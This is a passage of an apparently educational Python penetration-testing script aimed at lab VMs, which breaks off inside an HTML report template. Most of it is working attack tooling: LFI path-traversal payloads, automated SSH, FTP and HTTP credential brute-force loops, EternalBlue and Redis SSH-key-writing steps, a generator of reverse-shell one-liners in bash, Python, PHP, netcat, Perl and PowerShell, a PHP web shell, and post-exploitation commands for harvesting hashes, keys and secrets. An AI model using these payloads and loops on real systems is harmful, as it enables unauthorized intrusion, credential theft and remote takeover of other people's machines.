        "Change to:  ?file=../../../../etc/passwd  — if you see root:x:0:0, LFI works.",
        "Try reading web config:  ?file=../../../../var/www/html/config.php  or  php://filter/convert.base64-encode/resource=index.php",
        "If you get base64 output, decode it to see PHP source (and DB passwords).",
    ])
    troubleshoot([
        ("Blank page or 404", "Parameter name may differ (page, include, path, doc). Enumerate with ffuf or try common names."),
        ("Filtered / WAF", "Try double encoding (..%252f), null byte (....//etc/passwd%00), or /proc/self/environ."),
        ("PHP filter returns nothing", "Path might be wrong. Try resource=config.php or other files you know exist on the server."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 9: SSH BRUTE FORCE
# ─────────────────────────────────────────────────────────
SSH_CREDENTIALS = [
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "123456"), ("root", "admin"), ("root", ""),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("user", "user"), ("user", "password"), ("test", "test"),
    ("vagrant", "vagrant"), ("pi", "raspberry"), ("ubuntu", "ubuntu"),
    ("kali", "kali"), ("debian", "debian"), ("guest", "guest"),
    ("ftpuser", "ftpuser"), ("oracle", "oracle"),
]

def ssh_brute(target, open_ports):
    if 22 not in open_ports:
        return

    step(9, "SSH — Default Credential Check")
    explain("SSH Brute Force & Default Credentials",
        "SSH is the #1 way to get a remote shell on Linux.\n"
        "\n"
        "We test common default credentials that VulnHub VMs often use.\n"
        "\n"
        "If login succeeds → you have a SHELL on the machine!\n"
        "Then run:\n"
        "  id                          → are you root?\n"
        "  sudo -l                     → what can you run as root?\n"
        "  uname -a                    → kernel version\n"
        "  cat /etc/crontab            → cron jobs?\n"
        "  find / -perm -4000 2>/dev/null  → SUID binaries\n"
        "\n"
        "Real tools:\n"
        "  hydra -L users.txt -P rockyou.txt ssh://<target>\n"
        "  medusa -h <target> -U users.txt -P pass.txt -M ssh")

    if not HAS_PARAMIKO:
        warn("paramiko not installed — cannot do SSH brute force")
        warn("Install: pip install paramiko")
        tip(f"Manual: ssh root@{target}   (try passwords: root, toor, password, admin)")
        return

    info(f"Testing {len(SSH_CREDENTIALS)} common SSH credential pairs...")
    found_creds = []

    for username, password in SSH_CREDENTIALS:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, port=22, username=username,
                       password=password, timeout=4, banner_timeout=4,
                       auth_timeout=4)
            found(f"SSH LOGIN SUCCESS! → {username}:{password}")
            found_creds.append(f"{username}:{password}")
            REPORT["credentials_found"].append(f"SSH {username}:{password}")
            add_vuln("CRITICAL", "SSH Default Credentials",
                     f"SSH login successful with {username}:{password}",
                     f"ssh {username}@{target}  then run: id, sudo -l, uname -a")
            ssh.close()
        except paramiko.AuthenticationException:
            pass  # Wrong password, keep trying
        except Exception:
            break  # SSH down or blocked

    if not found_creds:
        warn("No default SSH credentials worked")
        tip(f"Try: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}")

    # Command → Manual steps → Troubleshooting (SSH)
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  ssh root@{target}   (then try passwords: root, toor, password)")
    manual_steps("How to do it manually (SSH login)", [
        f"Open terminal. Run:  ssh root@{target}",
        "When prompted for password, try:  root, toor, password, admin, 123456",
        "For brute force with wordlist:  hydra -L users.txt -P rockyou.txt ssh://" + target,
        "After login run:  id  and  sudo -l  to see your privileges",
    ])
    troubleshoot([
        ("Permission denied (publickey) or Connection refused", "Target only allows key auth or SSH is filtered. Try the username/password the tool found, or use Hydra with -t 4."),
        ("Hydra: wordlist not found", "Kali: rockyou at /usr/share/wordlists/rockyou.txt (gunzip first). Users: /usr/share/wordlists/metasploit/unix_users.txt."),
        ("Too many authentication failures", "SSH limits tries. Use Hydra with -t 1 or try manually with one password at a time."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 10: FTP BRUTE FORCE
# ─────────────────────────────────────────────────────────
FTP_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("ftp", "ftp"), ("ftp", "password"), ("user", "user"),
    ("root", "root"), ("root", "password"), ("anonymous", ""),
    ("ftpuser", "ftpuser"), ("test", "test"),
]

def ftp_brute(target, open_ports):
    if 21 not in open_ports:
        return

    step(10, "FTP — Credential Brute Force")
    explain("FTP Brute Force",
        "After checking anonymous access, we try common FTP credentials.\n"
        "\n"
        "Why FTP is dangerous:\n"
        "  • Credentials sent in PLAINTEXT (no encryption!)\n"
        "  • Often runs with poor access controls\n"
        "  • Writable dirs let you upload shells\n"
        "\n"
        "Real tool: hydra -L users.txt -P rockyou.txt ftp://<target>")

    info(f"Testing {len(FTP_CREDENTIALS)} FTP credential pairs...")
    for username, password in FTP_CREDENTIALS:
        try:
            ftp = ftplib.FTP(timeout=4)
            ftp.connect(target, 21)
            ftp.login(username, password)
            found(f"FTP LOGIN SUCCESS! → {username}:{password}")
            REPORT["credentials_found"].append(f"FTP {username}:{password}")
            add_vuln("CRITICAL", "FTP Weak Credentials",
                     f"FTP login with {username}:{password}",
                     f"ftp {target}  → login as {username}:{password}  → ls, get files")
            ftp.quit()
        except ftplib.error_perm:
            pass
        except:
            break

    # Command → Manual steps → Troubleshooting (FTP brute)
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  hydra -L users.txt -P rockyou.txt ftp://{target}")
    manual_steps("How to do it manually (FTP brute force)", [
        f"Create small user list (e.g. root, admin, ftp) and pass list (admin, password, 123456).",
        f"Run:  hydra -L users.txt -P pass.txt ftp://{target}",
        f"Or try interactively:  ftp {target}  then login with combinations the tool suggested.",
    ])
    troubleshoot([
        ("FTP connection timed out", "Port 21 may be closed or filtered. Confirm with: nmap -p 21 " + target),
        ("All logins fail", "Target may use non-default accounts. Use a larger user list (e.g. SecLists Usernames) and rockyou.txt."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 11: HTTP LOGIN BRUTE FORCE
# ─────────────────────────────────────────────────────────
HTTP_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("administrator", "admin"),
    ("root", "root"), ("root", "password"),
    ("user", "user"), ("test", "test"),
    ("guest", "guest"), ("demo", "demo"),
]

def http_brute(target, open_ports):
    if not HAS_REQUESTS:
        return

    web_ports = [p for p in open_ports if p in [80, 443, 8080]]
    if not web_ports:
        return

    step(11, "HTTP — Login Form Brute Force")
    explain("HTTP Login Brute Force",
        "Web login forms often have no lockout or rate limiting.\n"
        "We can try many username/password combinations automatically.\n"
        "\n"
        "How we detect success:\n"
        "  • Response changes significantly (different page)\n"
        "  • 'dashboard', 'welcome', 'logout' appear in response\n"
        "  • Redirect to a different URL\n"
        "\n"
        "Real tools:\n"
        "  hydra -L users.txt -P passwords.txt http-post-form\n"
        "    '/login.php:username=^USER^&password=^PASS^:Invalid'\n"
        "  Burp Suite Intruder → Cluster bomb attack")

    for port in web_ports:
        scheme = "https" if port == 443 else "http"
        base = f"{scheme}://{target}" if port in [80, 443] else f"{scheme}://{target}:{port}"

        login_endpoints = [
            ("/login.php",        {"username": "USER", "password": "PASS"}),
            ("/login",            {"username": "USER", "password": "PASS"}),
            ("/admin/login.php",  {"username": "USER", "password": "PASS"}),
            ("/wp-login.php",     {"log": "USER", "pwd": "PASS"}),
        ]

        for path, field_template in login_endpoints:
            url = f"{base}{path}"
            try:
                r = requests.get(url, timeout=3, verify=False)
                if r.status_code != 200:
                    continue

                info(f"Testing HTTP login at {url}")
                baseline_len = len(r.text)

                for username, password in HTTP_CREDS:
                    data = {k: username if v == "USER" else password
                            for k, v in field_template.items()}
                    try:
                        resp = requests.post(url, data=data, timeout=4,
                                            verify=False, allow_redirects=True)
                        success_words = ["dashboard", "welcome", "logout",
                                        "profile", "account", "admin panel"]
                        if any(w in resp.text.lower() for w in success_words):
                            found(f"HTTP LOGIN SUCCESS at {url} → {username}:{password}")
                            REPORT["credentials_found"].append(f"HTTP {url} {username}:{password}")
                            add_vuln("CRITICAL", "HTTP Weak Credentials",
                                     f"Login at {url} with {username}:{password}",
                                     "Access admin panel and look for file upload, RCE features")
                    except:
                        pass
            except:
                pass

    # Command → Manual steps → Troubleshooting (HTTP login)
    # Prefer standard ports 80 then 443 for the printed URL (not iteration order)
    first_web_port = 80 if 80 in web_ports else (443 if 443 in web_ports else next(iter(web_ports)))
    scheme = "https" if first_web_port == 443 else "http"
    base_http = f"{scheme}://{target}" if first_web_port in (80, 443) else f"{scheme}://{target}:{first_web_port}"
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Command to try:{C.RESET}  hydra -L users.txt -P pass.txt {base_http}/login.php http-post-form \"username=^USER^&password=^PASS^:Invalid\"")
    manual_steps("How to do it manually (HTTP login brute)", [
        f"Open the login page in browser: {base_http}/login.php  (or /wp-login.php for WordPress)",
        "Try by hand: admin/admin, admin/password, root/root. Watch for redirect or 'Welcome'.",
        "For Hydra: identify the exact form field names (F12 → Inspect) and the failure message (e.g. 'Invalid').",
        f"Run: hydra -l admin -P rockyou.txt {base_http}/login.php http-post-form \"user=^USER^&pass=^PASS^:Invalid\" -t 4",
    ])
    troubleshoot([
        ("No login page found", "Enumerate directories first (Step 5). Try /login, /admin, /wp-login.php, /user/login."),
        ("Hydra says Invalid form / 401", "Field names or URL may differ. Use Burp to capture the exact POST request and copy parameters."),
        ("Account locked / too many attempts", "VM may have lockout. Wait a few minutes or try from another IP; use -t 1 in Hydra to slow down."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 12: SMB ENUMERATION
# ─────────────────────────────────────────────────────────
def smb_check(target, open_ports):
    smb_ports = [p for p in open_ports if p in [139, 445]]
    if not smb_ports:
        return

    step(12, "SMB Enumeration — Network File Sharing")
    explain("SMB (Server Message Block)",
        "SMB is Windows file sharing, also on Linux via Samba.\n"
        "\n"
        "Why it's a goldmine:\n"
        "  • EternalBlue (MS17-010) → direct RCE without login!\n"
        "    Used by WannaCry ransomware in 2017\n"
        "  • Null sessions → browse shares anonymously\n"
        "  • Weak credentials → access file shares\n"
        "  • Pass-the-Hash → use hash without knowing password\n"
        "\n"
        "Key commands:\n"
        "  enum4linux -a <target>              → full enumeration\n"
        "  smbclient -L //<target>/ -N         → list shares anonymously\n"
        "  smbclient //<target>/share -N       → connect to share\n"
        "  nmap --script smb-vuln-ms17-010 <target>  → check EternalBlue\n"
        "\n"
        "Metasploit EternalBlue:\n"
        "  use exploit/windows/smb/ms17_010_eternalblue\n"
        "  set RHOSTS <target>\n"
        "  run")

    # Check if enum4linux / smbclient is available
    for tool in ["enum4linux", "smbclient", "nbtscan"]:
        result = subprocess.run(["which", tool], capture_output=True, text=True)
        if result.returncode == 0:
            info(f"Running {tool} against {target}...")
            if tool == "nbtscan":
                out = subprocess.run([tool, target], capture_output=True,
                                    text=True, timeout=10)
                if out.stdout:
                    print(out.stdout[:500])
            break
    else:
        warn("SMB tools (enum4linux, smbclient) not found")

    # Try null session via socket
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target, 445))
        found(f"SMB port 445 is open and accepting connections")
        add_vuln("HIGH", "SMB Port Open",
                 "SMB (445) is accessible. Check for EternalBlue and null sessions.",
                 f"nmap --script smb-vuln-ms17-010 -p 445 {target}")
        s.close()
    except:
        pass

    tip(f"nmap --script smb-vuln-ms17-010,smb-enum-shares -p 445 {target}")
    tip(f"smbclient -L //{target}/ -N")
    tip(f"enum4linux -a {target}")

    # Command → Manual steps → Troubleshooting (SMB)
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Commands to try:{C.RESET}  smbclient -L //{target}/ -N   then  nmap --script smb-vuln-ms17-010 -p 445 {target}")
    manual_steps("How to do it manually (SMB)", [
        f"List shares (no password):  smbclient -L //{target}/ -N",
        f"Connect to a share:  smbclient //{target}/sharename -N   then  ls, get <file>",
        f"Full enum:  enum4linux -a {target}   (users, groups, shares)",
        f"Check EternalBlue:  nmap --script smb-vuln-ms17-010 -p 445 {target}  — if VULNERABLE, use Metasploit ms17_010_eternalblue",
    ])
    troubleshoot([
        ("Connection refused / NT_STATUS_ACCESS_DENIED", "Port 445 may be closed or host blocks SMB. Run: nmap -p 139,445 " + target),
        ("smbclient/enum4linux not found", "Install: sudo apt install smbclient enum4linux  (Kali has them by default)."),
        ("EternalBlue not found but port open", "Target may be patched. Try null session and weak credentials (smbclient with -U user%pass)."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 13: OTHER DEFAULT CREDENTIALS (MySQL, Redis, etc.)
# ─────────────────────────────────────────────────────────
def check_other_services(target, open_ports):
    step(13, "Default Credentials — MySQL, Redis, MongoDB, VNC")
    explain("Other Service Defaults",
        "Many services run with default or empty credentials:\n"
        "\n"
        "  MySQL  (3306): root with no password → full DB access!\n"
        "  Redis  (6379): no auth by default → read/write anything\n"
        "  MongoDB(27017): no auth by default → dump all databases!\n"
        "  VNC    (5900): password 'password' or empty\n"
        "  Telnet (23):   same as SSH weak creds\n"
        "\n"
        "Redis special trick:\n"
        "  SLAVEOF attack → write SSH key to /root/.ssh/authorized_keys!\n"
        "  config set dir /root/.ssh\n"
        "  config set dbfilename authorized_keys\n"
        "  set x '\\nssh-rsa AAAA...your-key\\n'\n"
        "  save  →  now SSH in as root!")

    # MySQL check
    if 3306 in open_ports:
        info("MySQL is open — checking for unauthenticated access...")
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, 3306))
            banner_data = s.recv(256)
            if b"mysql" in banner_data.lower() or len(banner_data) > 4:
                found(f"MySQL accepting connections!")
                add_vuln("HIGH", "MySQL Exposed",
                         f"MySQL port 3306 is accessible from outside.",
                         f"mysql -h {target} -u root   (try empty password)\nmysql -h {target} -u root -p  (try: root, password, toor)")
            s.close()
        except:
            pass
        tip(f"mysql -h {target} -u root    ← try empty password!")
        tip(f"mysql -h {target} -u root -proot")

    # Redis check
    if 6379 in open_ports:
        info("Redis detected — checking for unauthenticated access...")
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, 6379))
            s.send(b"PING\r\n")
            resp = s.recv(64).decode(errors='ignore')
            if "PONG" in resp:
                found("REDIS IS UNAUTHENTICATED! No password required!")
                add_vuln("CRITICAL", "Redis Unauthenticated",
                         "Redis responds to PING without authentication.",
                         "redis-cli -h " + target + " INFO\n"
                         "Can write SSH keys: config set dir /root/.ssh")
            s.close()
        except:
            pass

    # MongoDB check
    if 27017 in open_ports:
        info("MongoDB detected — often runs without authentication")
        add_vuln("HIGH", "MongoDB Exposed",
                 "MongoDB port 27017 is accessible.",
                 f"mongo {target}:27017   then: show dbs, use admin, show collections, db.users.find()")
        tip(f"mongo {target}:27017")
        tip("show dbs → use admin → db.users.find()")

    # Command → Manual steps → Troubleshooting (default creds)
    print(f"\n  {C.MAGENTA}{C.BOLD}📌 Commands to try:{C.RESET}  mysql -h {target} -u root   |   redis-cli -h {target}   |   mongo {target}:27017")
    manual_steps("How to do it manually (MySQL / Redis / MongoDB)", [
        f"MySQL:  mysql -h {target} -u root -p   (try empty password or root, toor). Then: SHOW DATABASES; USE mysql; SELECT * FROM user;",
        f"Redis:  redis-cli -h {target}   then  INFO, KEYS *. If no auth, try writing SSH key (search 'redis ssh key write').",
        f"Mongo:  mongo {target}:27017   then  show dbs, use admin, show collections, db.users.find()",
    ])
    troubleshoot([
        ("mysql: connection refused", "Port 3306 may be closed or MySQL binds to localhost only. Check: nmap -p 3306 " + target),
        ("Redis PING works but no write", "Redis may be read-only or protected. Try INFO server and CONFIG GET dir to see if you can change paths."),
        ("Mongo auth required", "Some VMs enable auth. Try default credentials or skip; focus on other services."),
    ])


# ─────────────────────────────────────────────────────────
#  STEP 14: REVERSE SHELL GENERATOR
# ─────────────────────────────────────────────────────────
def reverse_shell_generator(target):
    step(14, "Reverse Shell Payload Generator")
    explain("Reverse Shells",
        "A reverse shell makes the TARGET connect BACK to YOU.\n"
        "\n"
        "Why reverse and not bind shell?\n"
        "  → Firewalls usually block INCOMING connections to target\n"
        "  → But OUTGOING connections are usually allowed\n"
        "  → So target calls us!\n"
        "\n"
        "Setup:\n"
        "  1. Your machine: nc -lvnp 4444    ← listen for connection\n"
        "  2. Exploit the vulnerability to run the shell payload\n"
        "  3. Target connects back → you have a shell!\n"
        "\n"
        "After getting shell:\n"
        "  Upgrade: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
        "  Then: Ctrl+Z, stty raw -echo, fg, reset")

    YOUR_IP = "YOUR_IP_HERE"
    PORT = "4444"

    print(f"\n{C.BOLD}{C.YELLOW}  ════ REVERSE SHELL PAYLOADS (replace {YOUR_IP} with YOUR IP) ════{C.RESET}\n")

    shells = {
        "Bash":
            f"bash -i >& /dev/tcp/{YOUR_IP}/{PORT} 0>&1",
        "Bash (encoded)":
            f"echo 'bash -i >& /dev/tcp/{YOUR_IP}/{PORT} 0>&1' | base64 | base64 -d | bash",
        "Python3":
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{YOUR_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        "PHP (one-liner)":
            f"php -r '$sock=fsockopen(\"{YOUR_IP}\",{PORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        "PHP (web shell file)":
            "<?php system($_GET['cmd']); ?>\n  → Save as shell.php, upload to server\n  → Access: http://target/shell.php?cmd=id",
        "Netcat (traditional)":
            f"nc -e /bin/bash {YOUR_IP} {PORT}",
        "Netcat (no -e version)":
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {YOUR_IP} {PORT} >/tmp/f",
        "Perl":
            f"perl -e 'use Socket;$i=\"{YOUR_IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
        "PowerShell (Windows)":
            f"powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('{YOUR_IP}',{PORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    }

    for name, payload in shells.items():
        print(f"  {C.CYAN}{C.BOLD}[{name}]{C.RESET}")
        print(f"  {C.GREEN}{payload}{C.RESET}\n")

    print(f"  {C.YELLOW}{C.BOLD}  Listener (run this on YOUR machine first):{C.RESET}")
    print(f"  {C.GREEN}nc -lvnp {PORT}{C.RESET}")
    print(f"\n  {C.YELLOW}  Resource: https://revshells.com  ← online generator{C.RESET}")


# ─────────────────────────────────────────────────────────
#  STEP 15: POST-EXPLOITATION CHECKLIST
# ─────────────────────────────────────────────────────────
def post_exploitation_guide():
    step(15, "Post-Exploitation & Privilege Escalation Checklist")
    explain("Privilege Escalation",
        "After getting a low-privilege shell, the goal is to become ROOT.\n"
        "\n"
        "Privesc = finding a way for your low-priv user to gain root.\n"
        "\n"
        "Common paths:\n"
        "  1. SUDO misconfig  → run any command as root\n"
        "  2. SUID binaries   → binaries that run as owner (root)\n"
        "  3. Cron jobs       → scripts root runs on schedule\n"
        "  4. Writable /etc/passwd → add your own root user\n"
        "  5. Kernel exploits → dirty cow, dirty pipe\n"
        "  6. Docker/LXC      → container breakout\n"
        "\n"
        "Automated scanners:\n"
        "  Linux:   ./linpeas.sh  or  ./linux-smart-enum.sh\n"
        "  Windows: .\\winpeas.exe or .\\PowerUp.ps1")

    sections = {
        "🔍 BASIC RECON (first things after shell)": [
            "id && whoami                          → who am I?",
            "hostname && uname -a                  → system info",
            "cat /etc/os-release                   → OS version",
            "ip a / ifconfig                       → network interfaces",
            "ss -tulpn / netstat -tulpn            → listening services",
            "ps aux                                → running processes",
        ],
        "🔑 SUDO MISCONFIGURATIONS": [
            "sudo -l                               → what can I run as root?",
            "sudo /bin/bash                        → if bash allowed = instant root",
            "sudo vim → :!/bin/bash               → GTFObins trick",
            "sudo find / → -exec /bin/bash \\;    → find GTFObin",
            "→ Check https://gtfobins.github.io for EVERY binary",
        ],
        "🚪 SUID BINARIES": [
            "find / -perm -4000 2>/dev/null        → find all SUID files",
            "find / -perm -u=s -type f 2>/dev/null → alternative",
            "→ Check each result on https://gtfobins.github.io",
            "Common exploitable SUIDs: nmap, vim, python, perl, bash, cp",
        ],
        "⏰ CRON JOBS": [
            "cat /etc/crontab                      → system cron jobs",
            "ls -la /etc/cron*                     → cron directories",
            "crontab -l                            → current user's crons",
            "cat /var/spool/cron/crontabs/*        → all user crons",
            "→ If root runs a script YOU can write → add reverse shell to it!",
        ],
        "📁 SENSITIVE FILES": [
            "cat /etc/passwd                       → user accounts",
            "cat /etc/shadow                       → password hashes (need root)",
            "find / -name '*.conf' 2>/dev/null     → config files",
            "find / -name '*.txt' 2>/dev/null | grep -i pass",
            "find / -name 'id_rsa' 2>/dev/null     → SSH private keys",
            "find / -name 'wp-config.php' 2>/dev/null → WordPress DB creds",
            "env                                   → environment variables (API keys!)",
            "history                               → command history",
        ],
        "🐧 KERNEL EXPLOITS": [
            "uname -a                              → kernel version",
            "cat /proc/version",
            "→ Search: '<kernel version> privilege escalation exploit'",
            "→ Common: DirtyCow (2.6.22-3.9), DirtyPipe (5.8-5.16.11)",
            "searchsploit linux kernel <version>",
        ],
        "🐳 CONTAINERS & SERVICES": [
            "docker ps / docker images             → Docker containers",
            "id | grep docker                      → in docker group? = root!",
            "cat /proc/1/cgroup | grep -i docker   → are we IN a container?",
        ],
        "🔧 AUTOMATED TOOLS (recommended!)": [
            "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
            "chmod +x linpeas.sh && ./linpeas.sh   → runs everything above + more",
            "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
            "./LinEnum.sh -r report -e /tmp/ -t",
        ],
    }

    for section, commands in sections.items():
        print(f"\n  {C.YELLOW}{C.BOLD}{section}{C.RESET}")
        for cmd in commands:
            print(f"    {C.GREEN}${C.RESET} {cmd}")


# ─────────────────────────────────────────────────────────
#  HTML REPORT GENERATOR
# ─────────────────────────────────────────────────────────
def generate_html_report(target):
    sev_colors = {
        "CRITICAL": "#ff4444",
        "HIGH":     "#ff8800",
        "MEDIUM":   "#ffcc00",
        "LOW":      "#44aaff",
        "INFO":     "#aaaaaa",
    }

    vuln_rows = ""
    for v in REPORT["vulnerabilities"]:
        color = sev_colors.get(v["severity"], "#aaa")
        vuln_rows += f"""
        <tr>
            <td><span class="badge" style="background:{color}">{v['severity']}</span></td>
            <td><strong>{v['title']}</strong></td>
            <td>{v['description']}</td>
            <td class="exploit-hint">{v['exploit_hint']}</td>
        </tr>"""

    ports_rows = ""
    for port, service in REPORT["open_ports"].items():
        ports_rows += f"<tr><td>{port}</td><td>{service}</td><td>{REPORT['banners'].get(port, 'N/A')[:100]}</td></tr>"

    creds_list = "".join(f"<li>🔑 {c}</li>" for c in REPORT["credentials_found"]) or "<li>None found</li>"
    web_list = "".join(f"<li><a href='{w['url']}' target='_blank'>{w['url']}</a> [{w['status']}]</li>"
                       for w in REPORT["web_paths"]) or "<li>None found</li>"
    sqli_list = "".join(f"<li>⚠️ {u}</li>" for u in REPORT["sqli_found"]) or "<li>None found</li>"
    xss_list = "".join(f"<li>⚠️ {u}</li>" for u in REPORT["xss_found"]) or "<li>None found</li>"
    lfi_list = "".join(f"<li>⚠️ {u}</li>" for u in REPORT["lfi_found"]) or "<li>None found</li>"
    cms_list = "".join(f"<li>📦 {c}</li>" for c in set(REPORT["cms_detected"])) or "<li>None detected</li>"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Red Team Report — {target}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:wght@300;400;700;900&display=swap');
  :root {{
    --bg:      #0a0c0f;
    --card:    #111318;
    --border:  #1e2530;
    --red:     #ff3344;
    --green:   #00ff88;
    --yellow:  #ffcc00;
    --blue:    #00aaff;
    --text:    #c8d0e0;
    --dim:     #5a6070;
  }}
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ background:var(--bg); color:var(--text); font-family:'Exo 2',sans-serif; }}

  /* HEADER */
  header {{
    background: linear-gradient(135deg, #0d0f12 0%, #1a0508 50%, #0d0f12 100%);
    border-bottom: 2px solid var(--red);
    padding: 40px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }}
  header::before {{
    content: '';
    position: absolute; inset: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 30px,
      rgba(255,51,68,0.03) 30px, rgba(255,51,68,0.03) 31px);
  }}
  header h1 {{
    font-size: 2.5rem; font-weight: 900;
    color: var(--red);
    text-shadow: 0 0 30px rgba(255,51,68,0.5);
    letter-spacing: 4px;
    font-family: 'Share Tech Mono', monospace;
  }}
  header .subtitle {{ color: var(--dim); margin-top: 8px; font-size: 0.9rem; letter-spacing: 2px; }}
  header .target-badge {{
    display: inline-block;
    margin-top: 16px;
    background: rgba(255,51,68,0.1);
    border: 1px solid var(--red);
    padding: 8px 24px;
    border-radius: 4px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 1.1rem;
    color: var(--green);
  }}

  /* LAYOUT */
  .container {{ max-width: 1200px; margin: 0 auto; padding: 30px 20px; }}

  /* SUMMARY CARDS */
  .summary-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 16px; margin-bottom: 40px;
  }}
  .stat-card {{
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 20px;
    text-align: center;
    transition: border-color 0.2s;
  }}
  .stat-card:hover {{ border-color: var(--red); }}
  .stat-card .num {{
    font-size: 2.5rem; font-weight: 900;
    font-family: 'Share Tech Mono', monospace;
  }}
  .stat-card .label {{ font-size: 0.75rem; color: var(--dim); margin-top: 4px; letter-spacing: 1px; text-transform: uppercase; }}
  .red    {{ color: var(--red); }}
  .green  {{ color: var(--green); }}
  .yellow {{ color: var(--yellow); }}
  .blue   {{ color: var(--blue); }}

  /* SECTIONS */
  .section {{ margin-bottom: 32px; }}
  .section h2 {{
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    color: var(--red);
    letter-spacing: 3px;
    text-transform: uppercase;
    border-left: 3px solid var(--red);
    padding-left: 12px;
    margin-bottom: 16px;
  }}
  .card {{
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 8px;
    overflow: hidden;
  }}

  /* TABLES */
  table {{ width: 100%; border-collapse: collapse; font-size: 0.85rem; }}
  th {{
    background: #0d1015;
    color: var(--dim);
    font-weight: 400;
    text-transform: uppercase;
    letter-spacing: 1px;
    font-size: 0.75rem;
    padding: 10px 16px;
    text-align: left;
    border-bottom: 1px solid var(--border);
  }}
  td {{ padding: 10px 16px; border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: top; }}
  tr:last-child td {{ border-bottom: none; }}
  tr:hover td {{ background: rgba(255,255,255,0.02); }}

  /* BADGES */
  .badge {{
    display: inline-block;
    padding: 3px 8px;
    border-radius: 3px;
    font-size: 0.7rem;
    font-weight: 700;
    font-family: 'Share Tech Mono', monospace;
    letter-spacing: 1px;
    color: #000;
  }}
  .exploit-hint {{
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.75rem;
    color: var(--green);
    white-space: pre-wrap;
  }}

  /* LISTS */
  ul {{ list-style: none; padding: 16px; }}
  ul li {{ padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.04); font-size: 0.85rem; }}
  ul li:last-child {{ border-bottom: none; }}
  ul a {{ color: var(--blue); text-decoration: none; }}

  /* GRID 2COL */
  .grid2 {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }}
  @media(max-width:768px) {{ .grid2 {{ grid-template-columns: 1fr; }} }}

  /* FOOTER */
  footer {{
    text-align: center;
    padding: 30px;
    color: var(--dim);
    font-size: 0.75rem;
    border-top: 1px solid var(--border);
    margin-top: 40px;
    font-family: 'Share Tech Mono', monospace;
  }}
</style>
</head>
<body>

<header>
  <div class="subtitle">RED TEAM ASSESSMENT REPORT</div>
  <h1>⚡ RECON COMPLETE</h1>
  <div class="target-badge">TARGET: {target} &nbsp;|&nbsp; {REPORT['os_guess']} &nbsp;|&nbsp; {REPORT['scan_time']}</div>
</header>

<div class="container">

  <!-- SUMMARY STATS -->
  <div class="summary-grid">
    <div class="stat-card">
      <div class="num {'green' if REPORT['host_alive'] else 'red'}">{('ALIVE' if REPORT['host_alive'] else 'DOWN')}</div>
      <div class="label">Host Status</div>
    </div>
    <div class="stat-card">
      <div class="num blue">{len(REPORT['open_ports'])}</div>
      <div class="label">Open Ports</div>
    </div>
    <div class="stat-card">
      <div class="num red">{sum(1 for v in REPORT['vulnerabilities'] if v['severity'] in ['CRITICAL','HIGH'])}</div>
      <div class="label">Critical/High</div>
    </div>
    <div class="stat-card">
      <div class="num yellow">{len(REPORT['vulnerabilities'])}</div>
      <div class="label">Total Findings</div>
    </div>
    <div class="stat-card">
      <div class="num green">{len(REPORT['credentials_found'])}</div>
      <div class="label">Credentials</div>
    </div>
    <div class="stat-card">
      <div class="num red">{len(REPORT['sqli_found']) + len(REPORT['xss_found']) + len(REPORT['lfi_found'])}</div>
